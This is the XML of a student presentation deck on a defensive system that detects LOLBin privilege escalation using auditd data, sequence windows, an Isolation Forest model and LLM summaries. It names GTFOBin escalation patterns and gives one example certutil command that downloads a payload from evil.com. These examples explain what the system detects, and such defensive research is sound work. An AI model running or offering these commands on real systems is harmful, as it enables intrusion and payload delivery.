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1695" cy="6858000"/>
  <p:notesSz cx="6858000" cy="9144000"/>
  <p:defaultTextStyle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theme" Target="theme/theme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5B21-E8EE-4505-87E0-7B7F2C3DBBD0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6D5D-A00E-4AA9-84F2-364CBECE0EE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09E6-1126-4CCC-8F95-892B304C12E9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0F9E-EF7E-4C26-8662-25A73F2263D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82BF-5467-4883-8896-824F7369BC9A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18080-B33E-4073-8615-72D8F5AE8F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6248-C912-41CA-84D9-08E1C7982093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9569-04AF-4288-8880-64CE52ABE7A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/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B636-F4D9-4299-85F9-44D23E27C49C}" type="datetimeFigureOut">
              <a:rPr lang="en-US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3E07-937E-4FED-8300-89129584345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C346-E4DF-45C0-848B-E2AC5513E0D5}" type="datetimeFigureOut">
              <a:rPr lang="en-US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B55B-FA15-48BA-860D-0231187503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B29E-DC2A-4D67-887F-3BE2DC8489D6}" type="datetimeFigureOut">
              <a:rPr lang="en-US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EBC0-ADA9-4FA7-889C-9287646BC7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563BD-7186-488E-816C-8F41FA24179F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25AB8-FB3A-479C-8780-0B7E5F586C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2C48-70E8-4C8D-81F4-17FB598144B8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C29A-6C4F-4141-86E3-1A3E2D58E3A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2B83-4DFE-444B-8222-D5FF1EA6B44C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C649-D3E0-46CB-87C1-67136E4226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A40F9-1701-4EB4-806D-4ED861E7A003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E78A-EB3E-401E-81B5-D7F53201DAF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DADCF-DC63-475D-8D69-AEBF4EDF3BBC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188720"/>
            <a:ext cx="4389120" cy="3474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Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>M.TECH CYBER SECURITY | MID-SEMESTER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9164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0F172A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>AI-Assisted Detection of LOLBin-Based</a:t>
            </a:r>
            <a:br>
              <a:rPr/>
            </a:br>
            <a:r>
              <a:rPr/>
              <a:t>Privilege Escalation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Defending enterprise systems by learning normal administrative behavior and catching living-off-the-land attacks using sequence context and AI explainability.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3657600"/>
            <a:ext cx="96012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8862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2563EB"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>PRESENTER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Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Anvesh Dhiraj Shivhare</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="950">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>M.Tech Cyber Security, Semester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8862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2563EB"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>INSTITUTION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Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>National Forensic Sciences University</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="950">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>School of Cyber Security &amp; Digital Forensics, Gandhinagar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8862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 b="1">
                <a:solidFill>
                  <a:srgbClr val="2563EB"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>SYSTEM STATUS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Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Complete End-to-End Pipeline</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="950">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Verified on Real Ubuntu System Logs &amp; Attack Traces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National Forensic Sciences University (NFSU), Gandhinagar | Mid-Semester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B91C1C"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>● THE CORE DEFENSIVE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rPr/>
              <a:t>The Threat: Hackers Hide in Plain Sight with LOLBins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rPr/>
              <a:t>Attackers abuse built-in operating system utilities to bypass traditional antivirus without dropping custom malware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45643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3456432" cy="502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B91C1C"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>1. Living-off-the-Land (LOLBins)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31272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Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Attackers No Longer Drop Files</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="950">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Modern attackers do not introduce custom exploit binaries. Instead, they abuse pre-installed, digitally signed system tools like find, python3, certutil, and tar to execute their attacks.</a:t>
            </a:r>
            <a:br>
              <a:rPr/>
            </a:br>
            <a:br>
              <a:rPr/>
            </a:br>
            <a:r>
              <a:rPr/>
              <a:t>Because these utilities are legitimately used by sysadmins every day, standard signature-based antivirus cannot simply block them without breaking normal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91640"/>
            <a:ext cx="345643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691640"/>
            <a:ext cx="3456432" cy="502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B91C1C"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>2. Traditional Antivirus Blind Spots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2331720"/>
            <a:ext cx="31272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Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Single Commands Look Innocent</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="950">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Traditional Security Information and Event Management (SIEM) and antivirus tools evaluate commands in complete isolation.</a:t>
            </a:r>
            <a:br>
              <a:rPr/>
            </a:br>
            <a:br>
              <a:rPr/>
            </a:br>
            <a:r>
              <a:rPr/>
              <a:t>When evaluated alone, commands like 'whoami' or 'tar' appear 100% benign. Traditional security scanners miss the malicious context connecting routine reconnaissance to privilege escalation.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691640"/>
            <a:ext cx="345643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0144" y="1691640"/>
            <a:ext cx="3456432" cy="502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B91C1C"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>3. The Supervised Learning Trap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331720"/>
            <a:ext cx="312724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 b="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Models Overfit to Known Attacks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="950">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Supervised ML models require huge labeled datasets of attacks. In real production networks, real attack data is virtually non-existent compared to normal logs.</a:t>
            </a:r>
            <a:br>
              <a:rPr/>
            </a:br>
            <a:br>
              <a:rPr/>
            </a:br>
            <a:r>
              <a:rPr/>
              <a:t>As academic research proves, supervised models simply memorize past attack strings and fail completely (dropping to ~50% accuracy) on new or obfuscated techniques.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D4ED8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>● OUR SCIENTIFIC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rPr/>
              <a:t>The Solution: Context Windows Catch Attack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rPr/>
              <a:t>Looking at sequences of 3 consecutive commands catches multi-step attacks that isolated scanners miss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37160" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr sz="1200" b="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Core Innovation: A Sliding Window of 3 Commands (Springer 2026)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:defRPr sz="1000">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Attackers rarely escalate privileges with just one command. A realistic exploit is a sequence: (1) Reconnaissance ➔ (2) Sudo/GTFOBin Exploit ➔ (3) Backdoor Staging. By analyzing a sliding window of 3 consecutive commands within each user session, our model captures the behavioral jump even if individual commands seem normal.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3456432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383280"/>
            <a:ext cx="312724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Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Process Lineage Rarity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Who Started Who?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr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Tracks parent-child process pairs. Normal system behavior has predictable parents (e.g., systemd starting sshd). When a shell suddenly spawns from 'find' or 'vim', the lineage rarity score triggers an immediate anomaly.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3246120"/>
            <a:ext cx="3456432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3383280"/>
            <a:ext cx="312724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Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Command Randomness &amp; NLP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Measuring Obfuscation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr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Computes command length, special character density, and text randomness (entropy). When attackers use Base64 encoding, reverse shells, or hex variables, the randomness score spikes far above ordinary human commands.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3246120"/>
            <a:ext cx="3456432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3383280"/>
            <a:ext cx="3127248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Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Unsupervised Anomaly Model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Learning Normal (Isolation Forest)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Rather than chasing endless new exploit signatures, our model trains strictly on normal system activity. Anything that deviates from normal admin behavior is isolated as an anomaly—no attack labels required.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34155"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>●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rPr/>
              <a:t>System Architecture: End-to-End Defensive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rPr/>
              <a:t>How endpoint system calls flow into sliding-window features, anomaly detection, and plain-English SOC summaries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5603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256032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rPr/>
              <a:t>1. Telemetry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21408"/>
            <a:ext cx="23408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Auditd Parser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Ingests raw Linux auditd streams in real time.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Combines process start, arguments, user ID, and working directory.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Decodes hex command lines into clean plaintext.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956048"/>
            <a:ext cx="228600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F172A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>OPERATIONAL ON LINUX</a:t>
            </a:r>
            <a:br>
              <a:rPr/>
            </a:br>
            <a:r>
              <a:rPr/>
              <a:t>(25,495 Real Events)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91640"/>
            <a:ext cx="25603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691640"/>
            <a:ext cx="256032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rPr/>
              <a:t>2.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21408"/>
            <a:ext cx="23408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3-Command Window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Calculates Process Lineage Rarity.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Extracts Command Randomness (Entropy) and length.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Maintains a sliding 3-command context window per session.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3592" y="4956048"/>
            <a:ext cx="228600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F172A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>SEQUENCE AWARE</a:t>
            </a:r>
            <a:br>
              <a:rPr/>
            </a:br>
            <a:r>
              <a:rPr/>
              <a:t>(Springer 2026 Grounded)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91640"/>
            <a:ext cx="25603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1344" y="1691640"/>
            <a:ext cx="256032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rPr/>
              <a:t>3. Anomaly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121408"/>
            <a:ext cx="23408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Isolation Forest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Trained strictly on clean, normal administrator baseline.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Scores events from 0.00 (Normal) to 1.00 (Severe Anomaly).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Flagging threshold set at 0.50 to minimize false alarms.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18504" y="4956048"/>
            <a:ext cx="228600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F172A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>UNSUPERVISED ML</a:t>
            </a:r>
            <a:br>
              <a:rPr/>
            </a:br>
            <a:r>
              <a:rPr/>
              <a:t>(No Attack Labels Needed)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691640"/>
            <a:ext cx="256032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06256" y="1691640"/>
            <a:ext cx="256032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Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>4. AI Explainability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984" y="2121408"/>
            <a:ext cx="2340864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Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>LLM SOC Analyst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Takes the mathematical anomaly score and command history.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Maps the technique to MITRE ATT&amp;CK framework.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="4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Generates a 1-paragraph plain-English incident report.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43416" y="4956048"/>
            <a:ext cx="228600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F172A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>INSTANT TRIAGE</a:t>
            </a:r>
            <a:br>
              <a:rPr/>
            </a:br>
            <a:r>
              <a:rPr/>
              <a:t>(No Mathematical Jargon)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3832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/>
              <a:t>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1" y="33832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/>
              <a:t>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338328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rPr/>
              <a:t>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79008"/>
            <a:ext cx="103164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Key Advantage: The pipeline is fully automated—events flow from auditd, get enriched with sequence context, scored by Isolation Forest, and translated into SOC-ready summaries by the LLM without </a:t>
            </a:r>
          </a:p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manual analyst intervention.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5803D"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>● REAL UBUNTU AUDITD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rPr/>
              <a:t>Real Ubuntu Results: Filtering Normal Sysadmin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rPr/>
              <a:t>Tested on 25,495 real Linux auditd events to prove normal activity doesn't cause false alarms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t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rPr/>
              <a:t>Normal Baseline Verification (N = 7,649 Held-Out Events)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• 25,495 Real System Events Collected: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Recorded from routine Ubuntu software updates, developer tests, cron jobs, and file operations.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• Strict 70/30 Split: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>17,846 events used to train the normal model; 7,649 separate events used to test false alarm rates.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• Only 4.67% False Positive Rate: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Over 95.3% of normal system tasks safely scored below the alarm boundary (threshold = 0.50).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• Median Anomaly Score of 0.03: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Typical system tasks scored near zero, proving normal behavior sits deep inside the safe zone.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• 87.4% Scored Under 0.20: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>6,682 events produced near-zero scores, showing high model confidence in routine system activity.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• Normal Tools Stay Clean: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Legitimate uses of 'find' (0.0% false alarms) and 'awk' (0.0% false alarms) were correctly left unflagged.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91640"/>
            <a:ext cx="542513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5_baseline_simpl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26480" y="1828800"/>
            <a:ext cx="5242255" cy="37057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5803D"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>● REAL UBUNTU AUDITD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rPr/>
              <a:t>Live Evidence: The 'id' Command Context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rPr/>
              <a:t>The exact same command scores 0.08 in isolation vs. 0.58 mid-sequence, proving sequence awareness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t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rPr/>
              <a:t>How Context Windows Elevate Subtle Reconnaissance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• The Reconnaissance Dilemma: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Hackers routinely execute 'id' or 'whoami' immediately after escalating privileges to verify root access. But sysadmins also run 'id' constantly.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• In Isolation (Score: 0.05 – 0.12): </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>When executed alone or in benign sessions, 'id' scores safely below the 0.50 alarm line (Events #68, #85, #109). Traditional single-command tools ignore it.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• Mid-Attack Sequence (Score: 0.58!): </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>When the exact same 'id' command is executed immediately after an exploit (like 'tar --checkpoint' or 'python3'), our 3-command window carries forward the suspicious context.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• Alarm Successfully Triggered: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The score immediately jumps from ~0.08 to 0.5792 &amp; 0.5834 (Events #83, #106)—crossing the 0.50 threshold and raising an alarm!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:defRPr sz="950" b="1">
                <a:solidFill>
                  <a:srgbClr val="1E3A8A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>• Springer (2026) Empirically Proven: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Evaluating command windows catches attackers checking root access even when using completely legitimate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91640"/>
            <a:ext cx="542513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7_window_context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26480" y="1828800"/>
            <a:ext cx="5242255" cy="3625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D4ED8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>● ATTACK BENCHMARKS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rPr/>
              <a:t>Attack Benchmarks: 100% Attack Chain Interception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rPr/>
              <a:t>Evaluated across three attack tiers; the 3-command window caught and stopped all 60 attack sequences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t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rPr/>
              <a:t>Performance Across Attack Complexity Tiers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr sz="950" b="1">
                <a:solidFill>
                  <a:srgbClr val="1E3A8A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:br>
              <a:rPr/>
            </a:br>
            <a:r>
              <a:rPr/>
              <a:t>Tier 1: Overt Single Attacks ➔ 100% Caught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Direct GTFOBin exploits (e.g., 'sudo find -exec', 'sudo python3 exec').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Every single overt attack command was caught immediately (100% recall, 0.995 F1).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr sz="950" b="1">
                <a:solidFill>
                  <a:srgbClr val="1E3A8A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:br>
              <a:rPr/>
            </a:br>
            <a:r>
              <a:rPr/>
              <a:t>Tier 2: Multi-Step Attack Chains ➔ 100% Intercepted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Realistic multi-step sequences: Reconnaissance ➔ Privilege Jump ➔ Backdoor Staging.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100% Chain Interception: All 60 out of 60 attack chains were flagged and halted!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Rapid Response: Average detection delay was only 0.25 commands (Step 0 or Step 1).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr sz="950" b="1">
                <a:solidFill>
                  <a:srgbClr val="1E3A8A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:br>
              <a:rPr/>
            </a:br>
            <a:r>
              <a:rPr/>
              <a:t>Tier 3: Stealthy &amp; Obfuscated Attacks ➔ 90.0% Caught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Attackers hiding commands with Base64 encoding or hex escaping.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="25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• Model still caught 90% of obfuscated attempts due to elevated command line randomness.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91640"/>
            <a:ext cx="542513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6_benchmark_simpl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26480" y="1828800"/>
            <a:ext cx="5242255" cy="34666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D4ED8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>● NEXT STEP: DUAL-OS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rPr/>
              <a:t>Next Step: Dual-OS Coverage (Windows Sysmon Integration)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rPr/>
              <a:t>Extending behavioral anomaly detection from Linux auditd to Windows endpoint telemetry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t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Heading 1: Dual-OS Coverage (Windows Sysmon Integration)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="200"/>
              </a:spcBef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Expanding our telemetry pipeline to protect both Linux and Windows environments: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rPr/>
              <a:t>• Implement Windows Sysmon Pipeline: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Next step is to implement a Windows Sysmon telemetry pipeline to capture endpoint activity alongside Linux auditd.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rPr/>
              <a:t>• Ingest Event ID 1 (Process Creation): </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The goal is to ingest Windows Event ID 1 (Process Creation) to catch Windows LOLBins like 'certutil' and 'powershell'.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rPr/>
              <a:t>• Ingest Event ID 11 (File Creation): </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Correlate suspicious payload staging (e.g. downloads into C:\Users\Public or C:\Windows\Temp).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rPr/>
              <a:t>• Cross-Platform Normalization: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Normalize Windows telemetry (Image, CommandLine, ParentImage, User) into our existing 21-key schema so our Isolation Forest requires zero retraining.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rPr/>
              <a:t>• Target Ubiquitous Native Tools: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Specifically detect malicious tool abuse without relying on easily bypassed antivirus signatures.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91640"/>
            <a:ext cx="542513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t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Target Windows Living-off-the-Land Binaries (LOLBins)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="200"/>
              </a:spcBef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Native Microsoft binaries targeted for behavioral monitoring in Phase 2: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2563EB"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>• certutil.exe (Ingress Tool Transfer): </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Abused to download payloads via '-urlcache -split -f http://evil.com/payload.exe'. Monitored via Event ID 1 &amp; 11.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2563EB"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>• powershell.exe (Execution &amp; Bypass): </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Abused via encoded commands ('-enc') and memory-only downloads to execute unapproved scripts without writing to disk.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2563EB"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>• mshta.exe (Scriptlet Proxy Execution): </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Executes remote malicious HTML applications and VBScript/JScript scriptlets, bypassing AppLocker.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2563EB"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>• rundll32.exe (Proxy DLL / Scriptlet Execution): </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Executes proxy DLL payloads via control panel applets or inline JavaScript protocol handlers.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2563EB"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>• regsvr32.exe (Squiblydoo Technique): </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Abuses COM scriptlets ('scrobj.dll') over HTTP to download and register malicious components silently.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D4ED8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>● NEXT STEP: ACTIVE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rPr/>
              <a:t>Next Step: Automated EDR Active Response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rPr/>
              <a:t>Connecting AI detection verdicts directly to automated host containment and remediation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1206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t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Automated EDR Active Response Module</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="200"/>
              </a:spcBef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Closing the loop between AI alert generation and autonomous incident containment:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="35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rPr/>
              <a:t>• Build Active Response Script: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Next step is to build an Active Response script connected directly to our LLM output (wazuh/active_response.py).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="35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rPr/>
              <a:t>• Strict Policy Trigger: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The goal is to automatically simulate killing the malicious process tree (PID) or locking the user account if the JSON dossier flags 'Verdict: Malicious'.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="35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rPr/>
              <a:t>• High-Confidence Safeguard (&gt;= 0.80): </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Mitigation only triggers when Confidence Score &gt;= 0.80, preventing accidental disruption of normal sysadmin tasks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="35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rPr/>
              <a:t>• Process Tree Termination: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Simulates terminating the attacker's execution tree: 'kill -9 &lt;PID&gt;' on Linux or 'taskkill /F /T /PID &lt;PID&gt;' on Windows.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="35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rPr/>
              <a:t>• Account Containment: </a:t>
            </a:r>
            <a:r>
